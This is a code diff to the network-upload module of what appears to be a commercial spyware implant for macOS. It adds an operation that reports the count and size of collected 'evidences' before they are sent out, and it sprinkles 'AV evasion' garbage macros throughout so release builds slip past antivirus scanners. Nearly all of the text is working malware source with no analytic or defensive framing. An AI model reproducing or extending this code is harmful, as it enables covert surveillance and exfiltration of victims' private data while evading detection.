@@ -10,9 +10,9 @@
 
 #import "LogNetworkOperation.h"
 
-#import "LogNetworkOperation.h"
 #import "NSMutableData+AES128.h"
-#import "FSNetworkOperation.h"
+//#import "FSNetworkOperation.h"
+#import "SizeNetworkOperation.h"  // send number and total size of evidences 
 #import "RCSMLogManager.h"
 #import "RCSMDiskQuota.h"
 
@@ -204,7 +204,9 @@
       
       // AV evasion: only on release build
       AV_GARBAGE_009
-      
+#ifdef DEBUG_LOG_NOP
+        infoLog(@"proto NOK");
+#endif
       return NO;
     }
   
@@ -284,7 +286,34 @@
   // AV evasion: only on release build
   AV_GARBAGE_006
   
-  NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
+  NSEnumerator *first_enum = [logManager getSendQueueEnumerator];
+    //TODO: check memory allocation
+    NSArray *array = [first_enum allObjects];
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
+    SizeNetworkOperation *sizeOP = [[SizeNetworkOperation alloc]
+                                    initWithTransport: mTransport
+                                    minDelay: mMinDelay
+                                    maxDelay: mMaxDelay
+                                    bandwidth: mBandwidthLimit];
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    if ([sizeOP perform:array] == NO)
+    {
+#ifdef DEBUG_LOG_NOP
+        errorLog(@"Error on SizeNetworkOperation");
+#endif
+    }
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
+    [sizeOP release];
+  // end TODO:
+  NSEnumerator *enumerator = [array objectEnumerator];
+    
   id anObject;
   
   // AV evasion: only on release build
